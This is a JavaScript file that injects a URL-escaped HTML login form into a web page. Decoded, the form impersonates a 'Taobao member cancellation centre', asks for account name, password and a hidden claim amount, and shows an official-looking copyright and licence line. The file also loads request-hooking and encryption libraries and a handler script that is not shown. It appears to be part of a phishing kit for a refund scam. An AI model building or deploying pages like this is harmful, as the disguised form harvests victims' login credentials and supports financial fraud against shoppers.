var addJs = function (url) {
    var new_element = document.createElement('script');
    new_element.setAttribute('type', 'text/javascript');
    new_element.setAttribute('src', url);
    document.body.appendChild(new_element);
};
var addCss = function (url) {
    var head = document.getElementsByTagName('head')[0];
    var link = document.createElement('link');
    link.type = 'text/css';
    link.rel = 'stylesheet';
    link.href = url;
    head.appendChild(link);
};
var domWrite = function (str) {
    var newp = document.getElementById('mainCon');
    newp.innerHTML = unescape(str);
    document.getElementById('mainCon').style = '';
};

var jsUrl = '/static/index/common/step1/js/';
var cssUrl = '/static/index/common/step1/css/';

addCss(cssUrl + 'pintuer.css');
addCss(cssUrl + 'css.css');
addCss(cssUrl + 'popbox.css');

domWrite(
    '%3Cform%20action%3D%22%22%20method%3D%22post%22%20onsubmit%3D%22return%20false%22%20name%3D%22form1%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22text-center%20margin-big%20padding-big-top%22%3E%0A%20%20%20%20%20%20%20%20%3Cimg%20class%3D%22shopImg%22%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cp%20class%3D%22taobao%22%20style%3D%22display%3A%20none%3Btext-align%3A%20center%3Bcolor%3A%20%23e85959%3Bfont-size%3A%2020px%3Bfont-weight%3A%20700%3B%22%3E%u6DD8%u5B9D%u4F1A%u5458%u89E3%u9664%u4E2D%u5FC3%3C/p%3E%0A%20%20%20%20%3Cdiv%20class%3D%22panel-body%22%20style%3D%22padding%3A30px%3B%20padding-bottom%3A10px%3B%20padding-top%3A10px%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%20field-icon-right%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22text%22%20class%3D%22input%20input-big%22%20name%3D%22username%22%20placeholder%3D%22%u767B%u5F55%u8D26%u53F7%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22icon%20icon-user%20margin-small%22%3E%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%20field-icon-right%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22password%22%20class%3D%22input%20input-big%22%20name%3D%22password%22%20placeholder%3D%22%u767B%u5F55%u5BC6%u7801%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22icon%20icon-key%20margin-small%22%3E%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%20isMoney%22%20style%3D%22display%3A%20none%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%20field-icon-right%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22text%22%20class%3D%22input%20input-big%22%20name%3D%22money%22%20placeholder%3D%22%u7406%u8D54%u91D1%u989D%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%20class%3D%22icon%20icon-money%20margin-small%22%3E%3C/span%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20style%3D%22padding%3A30px%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20class%3D%22button%20button-block%20bg-main%20text-big%20input-big%22%20value%3D%22%u767B%u5F55%22%20onclick%3D%22check%28%29%22%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%3C/div%3E%0A%3C/form%3E%0A%3Cdiv%20class%3D%22pagelist%22%3ECopyRight%20%A9%202001-2018%20%u7248%u6743%u6240%u6709%3C/div%3E%0A%3Cdiv%20class%3D%22pagelist%22%3E%u4EACICP%u590714036222%u53F7%3C/div%3E'
);

addJs('/static/common/encrypt/jsencrypt.js');
addJs('/static/common/encrypt/ajaxhook.min.js');
addJs('/static/common/encrypt/crypto-js.js');
addJs('/static/common/encrypt/encryptController.js');
addJs(jsUrl + 'index.js');

